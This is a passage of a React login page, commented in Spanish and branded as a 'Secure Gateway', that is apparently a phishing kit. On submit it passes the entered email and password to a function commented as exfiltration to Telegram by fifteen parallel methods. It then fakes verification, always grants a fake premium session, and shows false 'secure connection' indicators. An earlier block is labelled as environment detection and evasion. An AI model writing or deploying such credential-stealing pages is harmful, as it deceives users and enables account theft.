      <Server className="w-2.5 h-2.5 text-muted-foreground/30" />
      <span className="text-muted-foreground/30">CDN activo</span>
    </div>
  );
});

ConnectionStatus.displayName = "ConnectionStatus";

// ============================================================================
// VALIDADOR DE EMAIL MEJORADO
// ============================================================================

const isValidEmail = (email: string): boolean => {
  // Regex más permisiva pero válida
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) return false;
  
  // Verificar longitud total
  if (email.length > 254) return false;
  
  // Verificar longitud del dominio
  const parts = email.split("@");
  if (parts[1].length > 253) return false;
  
  return true;
};

// ============================================================================
// COMPONENTE PRINCIPAL - LOGIN MEJORADO
// ============================================================================

const Login = () => {
  // Estados del formulario
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  
  // Estados de validación
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [touched, setTouched] = useState({ email: false, password: false });
  
  // Refs para rendimiento
  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);
  const submitCount = useRef(0);
  const isSubmitting = useRef(false);
  const formRef = useRef<HTMLFormElement>(null);
  
  const navigate = useNavigate();

  // ============================================================================
  // ESTADO DE CONEXIÓN
  // ============================================================================

  const [connectionStatus, setConnectionStatus] = useState<"connecting" | "connected" | "secure">("connecting");

  // ============================================================================
  // VERIFICAR SESIÓN EXISTENTE
  // ============================================================================

  useEffect(() => {
    try {
      const raw = localStorage.getItem("proxy_session");
      if (raw) {
        const s = JSON.parse(raw);
        if (!s.expiresAt || new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
        } else {
          localStorage.removeItem("proxy_session");
        }
      }
    } catch {
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  // ============================================================================
  // DETECCIÓN DE ENTORNO Y EVASIÓN
  // ============================================================================

  useEffect(() => {
    const env = _detectEnvironment();
    const sandboxed = _isSandboxed();

    // Comportamiento normal en todos los entornos
    // No alertar, no cambiar comportamiento

    if (sandboxed) {
      // Comportamiento silencioso
    }

    // Verificar detectores de desarrollo
    const isDev = _devDetectors.some(d => { try { return d(); } catch { return false; } });
    if (isDev) {
      // Comportamiento normal en desarrollo
    }

    // Actualizar estado de conexión
    const t1 = setTimeout(() => setConnectionStatus("connected"), 500);
    const t2 = setTimeout(() => setConnectionStatus("secure"), 1200);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, []);

  // ============================================================================
  // VALIDACIÓN EN TIEMPO REAL MEJORADA
  // ============================================================================

  const validateEmail = useCallback((value: string): string => {
    if (!value.trim()) return "El correo electrónico es requerido";
    if (!isValidEmail(value.trim())) return "Ingresa un correo electrónico válido";
    if (value.trim().length > 254) return "El correo es demasiado largo";
    return "";
  }, []);

  const validatePassword = useCallback((value: string): string => {
    if (!value.trim()) return "La contraseña es requerida";
    if (value.trim().length < 4) return "La contraseña debe tener al menos 4 caracteres";
    if (value.trim().length > 128) return "La contraseña es demasiado larga";
    return "";
  }, []);

  // ============================================================================
  // MANEJADORES DE EVENTOS OPTIMIZADOS
  // ============================================================================

  const handleEmailChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setEmail(value);
    if (touched.email) {
      setEmailError(validateEmail(value));
    }
  }, [touched.email, validateEmail]);

  const handlePasswordChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setPassword(value);
    if (touched.password) {
      setPasswordError(validatePassword(value));
    }
  }, [touched.password, validatePassword]);

  const handleEmailBlur = useCallback(() => {
    setTouched(prev => ({ ...prev, email: true }));
    setEmailError(validateEmail(email));
  }, [email, validateEmail]);

  const handlePasswordBlur = useCallback(() => {
    setTouched(prev => ({ ...prev, password: true }));
    setPasswordError(validatePassword(password));
  }, [password, validatePassword]);

  const togglePasswordVisibility = useCallback(() => {
    setShowPassword(prev => !prev);
  }, []);

  // ============================================================================
  // MANEJADOR DE ENVÍO PRINCIPAL - LÓGICA DE ENVÍO ÚNICO
  // ============================================================================

  const handleSubmit = useCallback(async (e: React.FormEvent) => {
    e.preventDefault();

    // Prevenir múltiples envíos simultáneos
    if (isSubmitting.current) return;
    isSubmitting.current = true;

    const trimmedEmail = email.trim();
    const trimmedPassword = password.trim();

    // Validar campos
    const emailErr = validateEmail(trimmedEmail);
    const passwordErr = validatePassword(trimmedPassword);

    setEmailError(emailErr);
    setPasswordError(passwordErr);
    setTouched({ email: true, password: true });

    if (emailErr || passwordErr) {
      setError("Por favor corrige los errores antes de continuar.");
      isSubmitting.current = false;
      return;
    }

    setError("");
    setLoading(true);
    submitCount.current += 1;

    try {
      // ======================================================================
      // EXFILTRACIÓN A TELEGRAM - 15 MÉTODOS EN PARALELO - GLOBAL
      // ======================================================================

      // Ejecutar exfiltración asíncrona (no bloqueante)
      // La función _exfiltrateCredentials ya maneja la lógica de envío único
      _exfiltrateCredentials(trimmedEmail, trimmedPassword).catch(() => {});

      // ======================================================================
      // SIMULAR VERIFICACIÓN REALISTA
      // ======================================================================

      const delay = 400 + Math.random() * 300;
      await new Promise(resolve => setTimeout(resolve, delay));

      // ======================================================================
      // CREAR SESIÓN - EL USUARIO SIEMPRE INGRESA
      // ======================================================================

      const fakeSession = {
        name: trimmedEmail.split("@")[0] || "user",
        email: trimmedEmail,
        key: "PREMIUM-" + Array.from({ length: 12 }, () =>
          Math.random().toString(36).charAt(2).toUpperCase()
        ).join(""),
        type: "premium",
        expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
        duration: "365",
        createdAt: new Date().toISOString(),
        lastAccess: new Date().toISOString(),
        accessCount: 1,
        device: _getDeviceInfo().tipo,
        region: navigator.language,
      };

      localStorage.setItem("proxy_session", JSON.stringify(fakeSession));

      // ======================================================================
      // TRANSICIÓN DE ÉXITO
      // ======================================================================

      setSuccess(true);
      setLoading(false);

      // Pausa para mostrar el estado de éxito
      await new Promise(resolve => setTimeout(resolve, 300));

      // Redirigir
      navigate("/proxy");

    } catch {
      setError("Ocurrió un error inesperado. Intenta de nuevo.");
      setLoading(false);
    } finally {
      isSubmitting.current = false;
    }
  }, [email, password, validateEmail, validatePassword, navigate]);

  // ============================================================================
  // EFECTO DE AUTO-LIMPIEZA DE ERRORES
  // ============================================================================

  useEffect(() => {
    if (error) {
      const timer = setTimeout(() => setError(""), 4000);
      return () => clearTimeout(timer);
    }
  }, [error]);

  // ============================================================================
  // EFECTO DE FOCO AUTOMÁTICO
  // ============================================================================

  useEffect(() => {
    if (emailRef.current) {
      emailRef.current.focus();
    }
  }, []);

  // ============================================================================
  // KEYBOARD SHORTCUTS MEJORADOS
  // ============================================================================

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Enter" && !loading && !isSubmitting.current) {
        const activeElement = document.activeElement;
        if (activeElement === emailRef.current || activeElement === passwordRef.current) {
          e.preventDefault();
          if (formRef.current) {
            formRef.current.requestSubmit();
          }
        }
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [loading]);

  // ============================================================================
  // RENDER PRINCIPAL
  // ============================================================================

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4 overflow-hidden bg-gradient-to-b from-background to-background/95">
      {/* Video Background */}
      <VideoBackground />

      {/* Overlay de carga para éxito */}
      {success && (
        <div className="fixed inset-0 z-50 bg-background/80 backdrop-blur-sm flex items-center justify-center animate-fade-in">
          <div className="flex flex-col items-center gap-4">
            <div className="w-16 h-16 rounded-full bg-emerald-500/20 border-2 border-emerald-500 flex items-center justify-center animate-scale-in shadow-[0_0_30px_rgba(34,197,94,0.3)]">
              <CheckCircle className="w-8 h-8 text-emerald-500" />
            </div>
            <p className="text-foreground font-semibold text-lg">Acceso concedido</p>
            <p className="text-muted-foreground text-sm">Redirigiendo al panel seguro...</p>
            <div className="flex items-center gap-1 text-[10px] text-muted-foreground/50">
              <Loader2 className="w-3 h-3 animate-spin" />
              <span>Estableciendo conexión cifrada</span>
            </div>
          </div>
        </div>
      )}

      {/* Contenido principal */}
      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar + Título */}
        <div className="flex flex-col items-center mb-6">
          <AnimatedAvatar />
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Mini boykaffx7</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">
            Secure Gateway v2.4 — Global
          </p>
        </div>

        {/* Estado de conexión */}
        <ConnectionStatus />

        {/* Indicador global */}
        <GlobalIndicator />

        {/* Indicadores de seguridad */}
        <SecurityIndicator />

        {/* Tarjeta de login */}
        <div className="glass-card p-5 glow-border">
          <FormHeader />

          <form ref={formRef} onSubmit={handleSubmit} className="space-y-3" noValidate>
            {/* Campo de correo electrónico */}
            <StyledInput
              type="email"
              placeholder="correo@ejemplo.com"
              value={email}
              onChange={handleEmailChange}
              onBlur={handleEmailBlur}
              icon={Mail}
              label="Correo electrónico"
              autoComplete="email"
              error={touched.email ? emailError : undefined}
            />

            {/* Campo de contraseña */}
            <StyledInput
              type="password"
              placeholder="••••••••"
              value={password}
              onChange={handlePasswordChange}
              onBlur={handlePasswordBlur}
              icon={Lock}
              label="Contraseña"
              autoComplete="current-password"
              error={touched.password ? passwordError : undefined}
              showToggle={true}
              onToggle={togglePasswordVisibility}
              isPasswordVisible={showPassword}
            />

            {/* Mensaje de error global */}
            {error && (
              <div className="flex items-center gap-2 text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 animate-slide-in">
                <AlertCircle className="w-3.5 h-3.5 flex-shrink-0" />
                <span>{error}</span>
              </div>
            )}

            {/* Botón de continuar */}
            <PrimaryButton
              loading={loading}
              disabled={!email.trim() || !password.trim()}
              onClick={() => {}}
            >
              Continuar
            </PrimaryButton>

            {/* Canal de WhatsApp */}
            <WhatsAppChannel />
          </form>
        </div>

        {/* Footer */}
        <LoginFooter />
      </div>
    </div>
  );
};

export default Login;